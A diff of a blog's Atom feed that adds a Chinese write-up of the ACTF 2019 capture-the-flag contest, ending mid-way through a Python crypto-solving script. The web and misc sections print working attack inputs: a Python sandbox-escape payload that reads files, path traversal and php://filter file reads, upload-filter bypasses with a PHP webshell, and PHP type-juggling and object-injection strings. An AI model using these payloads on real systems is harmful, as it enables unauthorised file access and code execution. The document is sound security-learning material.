@@ -4,7 +4,7 @@
   <subtitle><![CDATA[闲置用]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="https://www.xtxtmtxtx.xyz/"/>
-  <updated>2019-03-10T15:00:49.917Z</updated>
+  <updated>2019-05-24T04:26:07.411Z</updated>
   <id>https://www.xtxtmtxtx.xyz/</id>
   
   <author>
@@ -13,6 +13,342 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[ACTF 2019]]></title>
+    <link href="https://www.xtxtmtxtx.xyz/articles/ACTF%202019/"/>
+    <id>https://www.xtxtmtxtx.xyz/articles/ACTF 2019/</id>
+    <published>2019-05-23T16:00:00.000Z</published>
+    <updated>2019-05-24T04:26:07.411Z</updated>
+    <content type="html"><![CDATA[<p>代码之后会放在 <a href="https://github.com/XTXTMTXTX/ACTF-2019" target="_blank" rel="external">https://github.com/XTXTMTXTX/ACTF-2019</a><br>
+一度第一名最后第四名，还喜提大一第二 <del>我哭了 你呢.jpg</del></p>
+<hr>
+<h2 id="trivial"><a class="header-anchor" href="#trivial">¶</a>Trivial</h2>
+<h5 id="welcome-social-media-questionnaire"><a class="header-anchor" href="#welcome-social-media-questionnaire">¶</a>Welcome, Social Media, Questionnaire</h5>
+<p>签到、签退题，不多说</p>
+<hr>
+<h5 id="shell-master"><a class="header-anchor" href="#shell-master">¶</a>Shell Master</h5>
+<p>nc连接上服务器之后先要求你提供 Auth Token （来自于网页，身份验证）。其实是个shell，但是几乎什么提示都没有，很容易蒙圈。联系题名输入 ls 发现蹦出了结果，好了 cat flag 完事。</p>
+<hr>
+<h5 id="proof-of-work"><a class="header-anchor" href="#proof-of-work">¶</a>Proof of Work</h5>
+<p>要你输入 hash 值后六位与他给出的相匹配，时限 30s 。题目 Hint 是暴力<br>
+但我打了个 300mb 的表。cat grep 出解</p>
+<hr>
+<h5 id="asm-tour"><a class="header-anchor" href="#asm-tour">¶</a>Asm Tour</h5>
+<p>照着给的 asm 里的注释一步步来就可以了，但我一开始没看到题目的问题在哪里。其实不用读完整个 asm ，到他要你求的寄存器的那几行代码上下翻看一下就出来了（当然要先读得懂）。</p>
+<hr>
+<h5 id="getting-started-with-blockchain-ethereum"><a class="header-anchor" href="#getting-started-with-blockchain-ethereum">¶</a>Getting Started with Blockchain Ethereum</h5>
+<p>给了个 MOOC 链接，我去看了一下<del>（并通过了第一周的学习任务）</del>。其实把他给的虚拟机环境下下来装好后直接照着里面的那个网页一步步操作下来就可以叻，我试的时候发现 Node 2 一直挖不出币，以为这是突破口。后来准备放弃之前直接交了 token 结果过了（当然之前我还 nc 地在 token 两旁加上了 ACTF{…} 结果 WA 。。看题目注释我以为是要自己加上格式）。</p>
+<hr>
+<h2 id="misc"><a class="header-anchor" href="#misc">¶</a>Misc</h2>
+<h5 id="where-is-my-flag"><a class="header-anchor" href="#where-is-my-flag">¶</a>where is my flag</h5>
+<p>pdf 密码爆破<br>
+答案是 easy</p>
+<hr>
+<h5 id="broken-png"><a class="header-anchor" href="#broken-png">¶</a>broken png</h5>
+<p>补上文件头，大概<br>
+我忘了</p>
+<hr>
+<h5 id="smile"><a class="header-anchor" href="#smile">¶</a>Smile</h5>
+<p>下下来运行<br>
+当然要安装好需要的库 以及一个摄像头<br>
+不知道为什么我的 ps3eye 它用不了<br>
+反正笔记本自带的可以。它没识别我的脸 它觉得后面的柜子在笑<br>
+反正然后就有 flag 了</p>
+<hr>
+<h5 id="arctic-tours"><a class="header-anchor" href="#arctic-tours">¶</a>Arctic Tours</h5>
+<p>图片格式题<br>
+拜读一下 format 文档把图片高改高即可 能看到被盖住的 flag<br>
+因为 flag 的文字顶部有一点点从隐藏的地方露出来了</p>
+<hr>
+<h5 id="open-your-eyes"><a class="header-anchor" href="#open-your-eyes">¶</a>open your eyes</h5>
+<p>这又是啥题来着。<br>
+等附件可以下载了 or 我想起来了我再补到我的 blog 上去。<br>
+反正应该也是水题</p>
+<hr>
+<h5 id="what-s-this-1-2-3"><a class="header-anchor" href="#what-s-this-1-2-3">¶</a>what’s this? 1 2 3</h5>
+<p>都是区块链相关地址 好像<br>
+百度一下 前两个比较好找 最后一个是 ZeroNet<br>
+配置好环境连接就可以了<br>
+国内访问可能需要梯子</p>
+<hr>
+<h5 id="catch-the-ghost"><a class="header-anchor" href="#catch-the-ghost">¶</a>Catch the Ghost</h5>
+<p>卡了好久。<br>
+以为是什么神秘隐写题。<br>
+第一层 zip 包 用 16 进制编辑软件把前 4 个字节交换一下打开 发现有密码<br>
+其实是位加密，修改标识位、强制解压都可以</p>
+<p>最后得到一个 pdf ，全文复制粘贴出来发现隐藏文字<br>
+把多出来的文字拼起来就有了</p>
+<hr>
+<h5 id="under-your-nose"><a class="header-anchor" href="#under-your-nose">¶</a>under your nose</h5>
+<p>哈哈，这题我没删<br>
+仔细观察发现图片上有矩阵一样的点，发现间距是固定的，调用 python 库把这些像素提取出来拼接得到 flag<br>
+人生苦短 我用 Python</p>
+<hr>
+<h5 id="old-school"><a class="header-anchor" href="#old-school">¶</a>Old School</h5>
+<p>古典加密<br>
+我深夜做的 做吐了x<br>
+好吧好吧 是我菜。<br>
+第一行 Caesar 丢进 quipqiup 就出来了<br>
+第三行 Vigenère 丢进 <a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="external">https://www.guballa.de/vigenere-solver</a> 也出来了<br>
+第二行我没头绪 到处找网站尝试解码 结果 <a href="rumkin.com">rumkin.com</a> 试到 Railfence 的时候出来了 很幸运。</p>
+<hr>
+<h5 id="flag-above-this-page"><a class="header-anchor" href="#flag-above-this-page">¶</a>flag above this page</h5>
+<p>hint 简单粗暴<br>
+查看 ssl 证书发现了隐藏域名 但是我解析不出来很崩溃<br>
+后来搜索 Lets Encrypt 证书的时候看到其用 TXT 解析验证域名主人的时候我才想起来有这么个东西<br>
+然后就好了 在线解析 txt 记录工具</p>
+<hr>
+<h5 id="xmas-ornaments-ranking"><a class="header-anchor" href="#xmas-ornaments-ranking">¶</a>Xmas Ornaments Ranking</h5>
+<p>用 Win Hex 看到结尾的 Xmas Ornaments Ranking Key了，感觉是某种编码。然后才意识到题名缩写就是 XOR<br>
+把开头字节和他给的 Key 异或一下就好了，结果得到个图片写着 flag</p>
+<hr>
+<h5 id="turtle"><a class="header-anchor" href="#turtle">¶</a>turtle</h5>
+<p>给的 hint 是 adblocker 和去哪儿网反爬虫<br>
+百度了一下发现反爬虫技术是和字体有关（我爬了个假文本）<br>
+然后我从爬虫入手，假装自己是百度蜘蛛访问 turtle （事后好像发现不影响）<br>
+然后发现浏览器下了个 eof 字体文件，先直接 16 进制编辑器打开，结果文件末尾的flag是假的。<br>
+转成 ttf 打开之后发现字体对几个字母进行了替换，接着查看 turtle 下下来的文件，在 css 文件里有个 ad 的 style 以及一个看着像乱码的 content， 直接对照那个字体进行替换就可以了。<br>
+但是那个字体不好认，但给了 flag md5 码，多试几次总能出来的。</p>
+<hr>
+<h5 id="pysandbox-6-10"><a class="header-anchor" href="#pysandbox-6-10">¶</a>pysandbox 6, 10</h5>
+<p>CTF-Wiki 上给的例子大部分是 python 2.7 的，而题目用的是python 3.7，payload 不能混用。<br>
+先是忘了在哪儿找到了个小魔法<br>
+<code>·().__class__.__bases__[-1].__subclasses__()</code><br>
+通过 <code>__dict__</code> 发现有个叫 FileLoader 的东西，进一步探索发现可以输出文件内容<br>
+构造<br>
+<code>[x for x in ().__class__.__bases__[-1].__subclasses__() if x.__name__ == 'FileLoader'][0].get_data('','flag')</code><br>
+过了 6<br>
+10 没几个人过，我以为很难。结果本地发现这个还是能用的，远程之后发现也是能用的，于是双倍经验。<br>
+大概不是期望解法？所以原本该怎么做</p>
+<hr>
+<h5 id="you-can-you-up"><a class="header-anchor" href="#you-can-you-up">¶</a>You can you up</h5>
+<p>mc 题<br>
+我只要一直跳跳跳就能拿到 flag 了！！！！<br>
+开个玩笑。<br>
+一开始是想直接获取 3d 模型，结果发现 mc 的提取比较难。<br>
+后来在网上找到了可以 dump 服务器地图的 mod，火速下载之，能用<br>
+接下来本地开那张图 gamemode 改一下飞上天就拿到 flag 了<br>
+本着增进室友关系的理念，我和我一个室友连进服务器玩了个把小时</p>
+<hr>
+<h5 id="turtle-v2"><a class="header-anchor" href="#turtle-v2">¶</a>turtle</h5>
+<p>给的 hint 是 adblocker 和去哪儿网反爬虫<br>
+百度了一下发现反爬虫技术是和字体有关（我爬了个假文本）<br>
+然后我从爬虫入手，假装自己是百度蜘蛛访问 turtle （事后好像发现不影响）<br>
+然后发现浏览器下了个 eof 字体文件，先直接 16 进制编辑器打开，结果文件末尾的flag是假的。<br>
+转成 ttf 打开之后发现字体对几个字母进行了替换，接着查看 turtle 下下来的文件，在 css 文件里有个 ad 的 style 以及一个看着像乱码的 content， 直接对照那个字体进行替换就可以了。<br>
+但是那个字体不好认，但给了 flag md5 码，多试几次总能出来的。</p>
+<h2 id="web"><a class="header-anchor" href="#web">¶</a>Web</h2>
+<h5 id="game-1-2-3-4"><a class="header-anchor" href="#game-1-2-3-4">¶</a>Game 1, 2, 3, 4</h5>
+<p>善用 F12 工具 以及自带的网络分析工具<br>
+还有 Fiddle<br>
+1 的 flag 藏在响应头里，</p>
+<p>2 先是 Fiddle 查看 302 跳转时的相应找到密码<br>
+bpu 给页面下断点 改 Refer 为 localhost<br>
+第三个页面有个 admin = 0 的 cookie 改成 1 重发请求</p>
+<p>3 robot.txt 得到密码<br>
+然后我卡关了。<br>
+后来找了个 ctf 专用扫描器 发现 images 文件夹存在，且可见 password txt 文件<br>
+第三关查看源代码发现 include 了 password.inc<br>
+直接访问该文件 f12 找到密码</p>
+<p>4 先看网站代码注释的提示，得知和 vim 备份有关<br>
+下载 <code>.index.php.swp</code><br>
+用 vim -r 打开得到密码<br>
+然后是网页遍历。先用 fiddle 给请求加上 cookie，再通过 fiddle 使 idm 能下载页面<br>
+然后直接从 id 1 下到 1000<br>
+发现 98 的时候文件大小就不一样， 打开得解。<br>
+查看网页注释 得知是 .git 泄露<br>
+GitHack 跑一下就好了，记得通过 fiddle 修改 cookie 访问，不然会调转到登录，软件就没法正常访问网页了。</p>
+<hr>
+<h5 id="file-inclusion-1-2"><a class="header-anchor" href="#file-inclusion-1-2">¶</a>file inclusion 1, 2</h5>
+<p>1 比较水，给 <code>/data/flag</code> 前加几次 <code>../</code> 就遍历到了 flag 文件<br>
+2 使用 php filter 防解析<br>
+<code>page=php://filter/read=convert.base64-encode/resource=flag.php</code><br>
+得到结果 base64 解一下就好了</p>
+<hr>
+<h5 id="upload-1-2-3-4"><a class="header-anchor" href="#upload-1-2-3-4">¶</a>Upload 1, 2, 3, 4</h5>
+<p>1 上传 php 之前把 <code>onsubmit=&quot;return checkFile()&quot;</code> 清了。 直接 Fiddle bpu 截获，修改请求头 为正常的 image 就过了<br>
+2 过滤后缀名，会把php清理掉，于是构造后缀名为 pphphp 即可，被过滤后反而成了 php 文件<br>
+3 把代码复制到正常 png 文件结尾处，后缀名改 <code>空格php</code> 提交即可<br>
+4 题目注释给了条件，发现php是先保存到文件夹后才判断文件有没有问题，所以是条件竞争题。<br>
+直接用 Bp intruder 不停发送请求，再在本地不停用 python 尝试在删之前访问 php，构造 php 直接读 flag 文件。</p>
+<p>php 写什么？一句话木马、只是读文件，都可以。</p>
+<hr>
+<h5 id="baby-php"><a class="header-anchor" href="#baby-php">¶</a>baby php</h5>
+<p>构造：<br>
+<code>?1=0e215962017&amp;2=1&amp;3=2&amp;result=4c1b50b5579037f7e0b3c4e067d9735e440772cb&amp;lucky[]=2</code><br>
+1 的值怎么来的呢，本地跑满足 (0eNUMBERS)==md5(0eNUMBERS) 的 NUMBERS，得 215962017，因为弱类型会把他们当数字处理，结果就都等于 0 了。<br>
+flag 后半段，构造 lucky[]=2 会导致 <code>hash_hmac('ripemd160', $lucky, $salt);</code> 返回空，于是 salt 对 hash 就无影响了，随便整个 2 和 3，接下来 的 result 就是可被我们计算的了。</p>
+<hr>
+<h5 id="another-php"><a class="header-anchor" href="#another-php">¶</a>another php</h5>
+<p>构造 <code>?%41AA_Bravo[]=1&amp;AAA=O:3:&quot;AAA&quot;:2:{s:6:&quot;melody&quot;;s:3:&quot;aaa&quot;;s:4:&quot;flag&quot;;R:2;}</code><br>
+<code>%41AA_Bravo[]=1</code> 绕过字符串限制，将AAA_Bravo存成数组可绕过对 AAA_Bravo 大小的检测。<br>
+后半段则是构造 Object 使得 melody 与 flag 同时一起改变，于是得到最终的 flag</p>
+<hr>
+<h5 id="eyes-can-lie"><a class="header-anchor" href="#eyes-can-lie">¶</a>eyes can lie</h5>
+<p>开局一张图，flag全靠猜x<br>
+好吧，点进去是一个机器人图像，联想到 robots.txt<br>
+robots.txt 发现了 一个 remember_to_delete_this.php 但是打开无奈 404<br>
+等一下，真的是 404 吗？<br>
+访问别的页面的时候发现 404 长得不一样，于是肯定就是伪装的了，F12 分析得到 super_secret.log<br>
+这文件看着像一堆乱码，先url解码<br>
+解码完发现是一堆 SQL 注入的访问，先把注释符啥的都删了，只留下 SQL 注入和对应的时间（使用在线正则表达式比较方便）<br>
+对于每条语句，查了一下发现其实就是在循环取字符串中每个字符的每一位，该位上是 1 则 Sleep 两秒。于是乎结合 log 中前后语句的时间间隔可以推出除了最后一位的字符串上的每一位，最终求出 flag 。懒得写代码，于是我手推了好一会儿。</p>
+<hr>
+<h2 id="reverse"><a class="header-anchor" href="#reverse">¶</a>Reverse</h2>
+<h5 id="real-babyrev"><a class="header-anchor" href="#real-babyrev">¶</a>real babyrev</h5>
+<p>IDA F5<br>
+Y0u_4re_7he_B3st</p>
+<hr>
+<h5 id="real-childrev"><a class="header-anchor" href="#real-childrev">¶</a>real childrev</h5>
+<p>F5<br>
+<code>~M|@juJ@K@\&quot;@]G\\z</code> 与 0x1F 异或一下</p>
+<hr>
+<h5 id="easy-reverse"><a class="header-anchor" href="#easy-reverse">¶</a>easy reverse</h5>
+<p>打开先 F5，代码有点怪。分析了一下发现 main 中 第一个判断是判断输入是否为 18 位 ACTF 开头字符串，sub_401367() 是输出函数，然后 CreateTread 的其实就是第二部分的验证。进入StartAddress观察，发现其实就是判断输入的第 5 ~ 18 位字符异或 97 是否与已知数相同。于是直接把四个判断的四个数字复制出来，先每四字节分别字节翻转（小端序），再每个字节异或 0x97 就得到了要输入的内容，也就是 flag</p>
+<hr>
+<h5 id="md5-hacker"><a class="header-anchor" href="#md5-hacker">¶</a>md5 Hacker</h5>
+<p>F5，程序流程是先读32长的字符串到 0x601160 中并判断是否符合格式，接着进入主要的 sub_4009AB() 部分。进入 sub_400896 可知该函数对一个4位字符串求 MD5 码并存到另一个字符串里。综上，题目是将输入的 32 位字符串分成 8 组，每组分别求 MD5 码，再将 MD5 与 <code>r_u_a_md5_hacker</code> 异或，并与已知的 unk_6010A0 + 16 * i 比较。逆推的话先将 unk_6010A0 开始的 16 * 8 个字符串从程序中复制出来并依次与 <code>r_u_a_md5_hacker</code> 异或，得到 8 组 md5 ，再在在线 md5 解密网站分别解密（或者本地打表，每次就四位），依次拼接起来两边加上 ACTF{…} 就是 flag 了</p>
+<hr>
+<h5 id="endless-elf"><a class="header-anchor" href="#endless-elf">¶</a>Endless ELF</h5>
+<p>观察发现代码中 <code>qword_6010A0 = sub_4005F6(0xAAALL);</code> 极度影响程序速度，因为是不断地在递归运算。将 sub_4005F6 反编译的代码复制出来，加入记忆化搜索优化，输出解为 0x45793CEED72DAC19 。接着回到这个程序，把 <code>call sub_4005F6</code> Patch 掉，丢到虚拟机里远程调试，手动修改 qword_6010A0 值为上述数字就得到 flag 了。<br>
+PS: 因为是 64 位数字，本地跑的时候要用 <code>%llX</code> 输出<br>
+PSS: 其实也可以直接 patch <code>mov rax, 45793CEED72DAC19h</code> 上去， ida 自带的 patch 比较鸡肋不能这么汇编，强烈推荐 Keypatch 111111</p>
+<hr>
+<h5 id="babyrev"><a class="header-anchor" href="#babyrev">¶</a>babyrev</h5>
+<p>乍一眼看上去一堆 while 和 goto 引起强烈不适。仔细思考，冷静分析，可以发现大部分代码不过是在求字符串 s 中每个字母在 a0123456789abcd 中的下标，也就是特殊映射过的字母转数字。进一步观察会发现 sub_950(a1, a2, a3) 所做的事是将 a1 看作行优先的 37*37 的矩阵，a2 看作列向量，并将 mod 79 下的  a1*a2 存入 a3。a1 是 aFourScoreAndSe 中的文本转数字，a2 是 flag 的文本转数字，a3 是得到的。问题转化为 a1、a3 已知求 a2。于是在模意义下求 a1 的逆矩阵，最终求个 (a1)^-1*a3 即为 flag 转为数字后的样子，再转回去就行了。<br>
+至于模意义下的求逆矩阵，直接高斯消元法即可。因为79是素数，因此 1~78 每个数都有不同的乘法逆元，只要把高斯消元里的除改成乘逆元即可。</p>
+<hr>
+<h5 id="aaa-maker"><a class="header-anchor" href="#aaa-maker">¶</a>AAA Maker</h5>
+<p>是个游戏。<br>
+反编译找比较关键的函数，最后找到要输入 <em>神奇语句</em> 得到什么什么什么。进一步观察发现是对一块空间用输入循环异或后直接调用，因此从函数开头的共同特点入手。<br>
+将解密前的函数头与其他的函数头复制出来，将前7位应该很可能解密后是一样的字节异或，得到 Key <code>Hav3FuN</code>，然而对于接下来象征栈空间大小（应该是这个，我猜的）的字节是不确定的，先拿这个 Key 异或一遍再说。结果再次反编译的时候就可以解析那个函数了，最后得到 flag。</p>
+<hr>
+<h5 id="strange-exe"><a class="header-anchor" href="#strange-exe">¶</a>Strange EXE</h5>
+<p>是水题。是水题。是水题。是水题。<br>
+做得很晚是因为不知道更新过附件了，其实早就找到 flag 了，然而是假的。<br>
+下好文件先用 ida 打开，发现了奇怪的字符串，像 jar2exe 这种。于是下个 jar 反编译器，比如 jd-gui。直接把 exe 拖上去查看 Secret 类翻一翻就看到 flag 了，还是明文</p>
+<hr>
+<h5 id="findfunc"><a class="header-anchor" href="#findfunc">¶</a>findfunc</h5>
+<p>apk 解包，用 ida 打开class什么什么文件发现关键函数（什么什么 Check，没错我又把程序删了），然后打开 .so 文件，找到了非常显眼的函数，发现了非常抽象的 (v3+676)(v3…) 什么的函数。直接修改对应变量的 type 为 JNIEnv* 他就变得正常了。<br>
+发现了一个被 strcmp 的字符串 flag{xxxxxxx} 在手机上安装 apk，输入，显而易见不对。<br>
+根据hint，找找别的函数，发现了一个调用了 mprotect 并将那个显眼的函数 jmp 到另一个函数的函数。推测 jmp 到的目标函数才是真正的函数。<br>
+这个函数的逻辑大概是 sub_C000FB8 先将字符串 <code>&quot;Java_com_a_findfunc_MainActivity_check&quot;</code> 进行处理成 v9，再将 v9、输入的字符串一并用 sub_C001030 处理，最后和另一处存着的字节做对比。<br>
+我懒得仔细观察那两个处理函数了，直接反编译、复制、粘贴、修改变量类型名使得通过编译。然后在本地模拟那个 check 函数的处理。<br>
+分析得出，每个字符在被处理之后互不影响别的字符处理结果，于是可以一个个依次枚举，最多跑 256*24 次，很快就出 flag{} 了。把这个 flag 复制到程序里得到真正的 flag。<br>
+PS：因为处理过程中的函数开小了结果爆栈调了很久。不能加边界判断真是坏文明（明明是你习惯不好）</p>
+<hr>
+<h2 id="crypto"><a class="header-anchor" href="#crypto">¶</a>Crypto</h2>
+<h5 id="warm-up1"><a class="header-anchor" href="#warm-up1">¶</a>Warm Up1</h5>
+<p>字符串看成两部分 l 和 r<br>
+推推推推推推推推<br>
+得到<br>
+newl = k1 ^ r<br>
+newr = k2 ^ l ^ r<br>
+所以<br>
+k1 = newl ^ r<br>
+k2 = newr ^ l ^ r<br>
+r = newl ^ k1<br>
+l = newr ^ k2 ^ r = newr ^ k2 ^ newl ^ k1<br>
+于是可以通过已知的 fake_flag 的明文密文先求出 k1 k2<br>
+再用 k1 k2 求出flag</p>
+<hr>
+<h5 id="warm-up3"><a class="header-anchor" href="#warm-up3">¶</a>Warm Up3</h5>
+<p>观察函数，发现每次操作都是将上一次结果左移一位，在最右边空出来的那位加上上次结果 &amp;mask 之后 1 的位的个数 &amp;1，最后取208位，于是可以逆推。<br>
+每次操作先取出最右边那位记为 z，再看看左边 207 位右移一位再 &amp;mask 后有多少个1，记为 k ，如果 k&amp;z == 1 说明最左边缺了了个 1，否则缺了个0。于是操作 208 次就是原先的 flag</p>
+<hr>
+<h5 id="warm-up4"><a class="header-anchor" href="#warm-up4">¶</a>Warm Up4</h5>
+<p>存在一个映射 S(x) 将字符串中每个字符映射成另一个<br>
+题目是先对字符串填充，然后8个一行，进行了随机次运算，最后再将列的顺序打散<br>
+根据最后一行有四个 0x48 ，推测是 Sn(0x04)==0x48<br>
+先求 R(S(x))=x<br>
+于是 不断递推 slist=[chr(R[ord(i)]) for i in slist] 直到 0x48 变回了 0x04<br>
+当然还是不对的，但是我们可以通过已知的字符和语义得到相应的列的顺序。<br>
+剩下的就是继续逆推+md5验证字符串是不是所求 flag。</p>
+<hr>
+<h5 id="unsafe-ctr"><a class="header-anchor" href="#unsafe-ctr">¶</a>Unsafe CTR</h5>
+<p>对每次加密，求 mj 使得 ci,j^mj 仍然是可读字符串的范围，最后从后往前猜词即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">cs=[<span class="string">'167c7f4fff941dea1b0b97f49e6d51fea7878c281f8d981e4fb358051eefac10c140327c77ad640bed157fa1c93717485d777d916be782732095fee4c21ca0ea56f248a5b8a0398950f38117877c1ac8b17f758af1e0f08e26b5e86d28137b'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'177d3349e5cb49a70e4292f0d37c1eb7bdc9b71e26aedd5d1bb35f0408efba55c04c30747cf93e4497507cb09b251d514a6b7d946ba18f6e2299b0fa8d1defa256f70dc9b0ee6cd107f59c538b605cdbbc3c21d9c2cfdc8044f2a8367e1d3a'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'11777f48e5950cea1804dce2cb7a56feb8889f3808c79b1249fe4b060daaed51df0f0b717cf91842dd156af5bd21586a406036c32eee95210693b0c6830ba7ea63e90dc986a6239d15baa0529d6756daf073678adec7d68e26bde47725413a'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'7f387f05aab001ab03428bf49e694cb1ad85992400c7dd5d52e01e3e04aaed62c548376d398d250bed1872b9c40c1d5441757dc359e48b6d7fbef5ea8c0fefac58f348a8bda26dd15dbaa65f8b3279c1be6d74cfc5da85c10cfcc46a355270'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'1b777f5ce59249ab1b0edce5d67050b5ee9d902c19c7891552e01e0904aea35ec9437f7178aa6a49df1870f58b3c1d5c4c7a388731a1a9603adcfff69048a3af5be0068df1bb229806ba914597624ec1f07b74d396c7d68e1eb3f6383f5534'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'16767f51e28e1aea1a0d98f49e394ab6abc991230493941c57b3480f0fbba2428c66093970aa6a59df0d7bb49d2b1c515632388d6df39e712699f4a39607efa555f50980bfee2dd103ff861781741ad8b17074cfc58effc74abdf538365c78'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'16757f56e5951bb3572f9de3d77612feac9c8c6d2ea8b32974c0714a3c9d847eef6a0c4a39b0390bd3133eb4c92a115b49772f8660f5c7673d8ef5f09649efe717d21f80b7ba039f23ff91429c7b4ed7f04860d3969c959f5ff1b62b7d012d'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'1e6c7f4ae48249ba180b92e59e501ea9af9ad82908859c0952fd594a1ba7a844c44a2d3976ab6a45d5093ea1866e19594b32298b6ba1b24210b1d6c8ae3cefa958f11199b0bd389050f59c17867748cbf07e74de96e785c60baae338245c7b'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'326d3c4daa940ca611428ef4cd695bbdbac7d8000c8c94135cb34c0b02aba25d8c43306b7cb46a42ca0e6bb8c9270b1d4e7129966fed8b78729db0ef8d1cefa256f30c8ca3ee389911f4d25880771ad9bf696dce96dacdc704b7a66c325b34'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'1e5b0b63a49006a7120c9af4d06a56b1bb8b99611a888f1c55f4590f05a4a442cd01'</span>.decode(<span class="string">'hex'</span>)]</span><br><span class="line"></span><br><span class="line">dict=<span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">dict+=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">dict+=<span class="string">'0123456789'</span></span><br><span class="line">dict+=<span class="string">'!?-., '</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> keylenth <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">96</span>):</span><br><span class="line">    k=[]</span><br><span class="line">    passw=[]</span><br><span class="line">    <span class="keyword">for</span> jjj <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        k+=[&#123;&#125;]</span><br><span class="line">        passw+=[[]]</span><br><span class="line">    flag=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(cs[i])):</span><br><span class="line">            k[j%keylenth][cs[i][j]]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keylenth):</span><br><span class="line">        flag1=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            flag2=<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> k[i]:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span>(chr(ord(l)^j) <span class="keyword">in</span> dict):</span><br><span class="line">                    flag2=<span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag2):</span><br><span class="line">                flag1=<span class="number">1</span></span><br><span class="line">                passw[i]+=[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span>(flag1):</span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">print</span> keylenth</span><br><span class="line">        <span class="keyword">print</span> passw</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">print</span> i,passw[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">95</span>):</span><br><span class="line">        <span class="keyword">if</span> len(passw[i])==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">print</span> i,passw[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(input1,input2)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        ps=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(cs[i])):</span><br><span class="line">            <span class="keyword">if</span> j==input1:</span><br><span class="line">                ps+=chr(passw[input1][input2]^ord(cs[i][j]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span>(len(passw[j])==<span class="number">1</span>):</span><br><span class="line">                    ps+=chr(passw[j][<span class="number">0</span>]^ord(cs[i][j]))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ps+=<span class="string">'?'</span></span><br><span class="line">        <span class="keyword">print</span> ps</span><br><span class="line"></span><br><span class="line">            k[j%<span class="number">95</span>][cs[i][j]]=<span 